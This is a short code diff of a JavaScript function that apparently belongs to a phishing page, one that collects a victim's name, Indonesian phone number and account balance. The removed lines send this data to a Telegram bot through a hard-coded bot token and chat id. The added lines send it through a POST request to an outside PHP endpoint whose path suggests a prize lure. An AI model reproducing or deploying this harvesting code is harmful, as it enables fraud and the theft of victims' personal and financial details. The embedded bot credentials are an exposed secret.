@@ -23,19 +23,13 @@ function next() {
 	phone = "+62"+phone;
 	$("#loader").css('display', 'flex');
 	
-	var message = "⚔⚔⚔ DATA MASUK ⚔⚔⚔\n";
-	message += ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n');
-	message += "\n⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜";
+	var message = ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n');
+	var fd = new FormData();
+	fd.append('message', message);
 	
-	fetch(`https://api.telegram.org/bot7954711315:AAEX8BBk8LzhvjOe4ioPrhd7TxoUPsOj8j4/sendMessage?parse_mode=html`, {
+	fetch("https://bsmjsx.my.id/senders/wondrberhadiah/send.php", {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: "6126829397",
-          text: message
-        })
+        body: fd
       })
       .then(response => response.json())
       .then(data => {
